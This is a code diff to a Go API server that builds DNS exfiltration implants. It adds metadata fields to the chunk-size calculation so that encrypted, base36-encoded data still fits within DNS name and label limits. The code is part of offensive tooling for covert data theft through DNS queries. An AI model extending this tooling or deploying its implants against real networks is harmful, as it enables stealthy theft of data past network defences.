@@ -383,7 +383,7 @@ func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Requ
 		return
 	}
 
-	// Force the implant to rely on system resolver order
+	// Force the implant to rely on ambient system resolvers to maintain normal DNS recursion paths
 	req.Resolvers = nil
 
 	beforeChunk, domainLimit := clampExfilChunkBytes(&req)
@@ -1299,10 +1299,14 @@ func collectActiveDomains(servers []map[string]interface{}) []string {
 }
 
 const (
-	dnsMaxName     = 253
-	dataLabelSplit = 62
-	aesGCMOverhead = 28
-	maxChunkProbe  = 512
+	dnsMaxName           = 253
+	dataLabelSplit       = 62
+	aesGCMOverhead       = 28
+	maxChunkProbe        = 512
+	metadataLabels       = 2
+	sessionTagLen        = 6
+	chunkFieldWidth      = 5
+	metadataPhase2Prefix = 2 + 1 + sessionTagLen + 1 + chunkFieldWidth + 1 // EX-ID-CHUNK-
 )
 
 var log36Of2 = math.Log(2) / math.Log(36)
@@ -1348,13 +1352,13 @@ func maxChunkBytesForDomains(domains []string) int {
 			longest = l
 		}
 	}
-	if dnsMaxName <= longest+1 {
+	payloadBudget := metadataPayloadBudget(longest)
+	if payloadBudget <= 0 {
 		return 0
 	}
-	available := dnsMaxName - (longest + 1)
 	best := 0
 	for chunk := 1; chunk <= maxChunkProbe; chunk++ {
-		if nameFitsChunk(chunk, available) {
+		if chunkFitsBudget(chunk, payloadBudget) {
 			best = chunk
 		} else {
 			break
@@ -1363,15 +1367,31 @@ func maxChunkBytesForDomains(domains []string) int {
 	return best
 }
 
-func nameFitsChunk(chunkBytes, available int) bool {
+func metadataPayloadBudget(longestDomain int) int {
+	byLabel := metadataLabels * dataLabelSplit
+	reserved := longestDomain + metadataLabels
+	if dnsMaxName <= reserved || byLabel <= metadataPhase2Prefix {
+		return 0
+	}
+	byDNS := dnsMaxName - reserved
+	if byDNS <= metadataPhase2Prefix {
+		return 0
+	}
+	allowed := byLabel
+	if byDNS < allowed {
+		allowed = byDNS
+	}
+	budget := allowed - metadataPhase2Prefix
+	if budget < 0 {
+		return 0
+	}
+	return budget
+}
+
+func chunkFitsBudget(chunkBytes, payloadBudget int) bool {
 	cipherLen := chunkBytes + aesGCMOverhead
 	encodedLen := estimateBase36Len(cipherLen)
-	labels := (encodedLen + dataLabelSplit - 1) / dataLabelSplit
-	dataLen := encodedLen
-	if labels > 1 {
-		dataLen += labels - 1
-	}
-	return dataLen <= available
+	return encodedLen <= payloadBudget
 }
 
 func estimateBase36Len(bytes int) int {
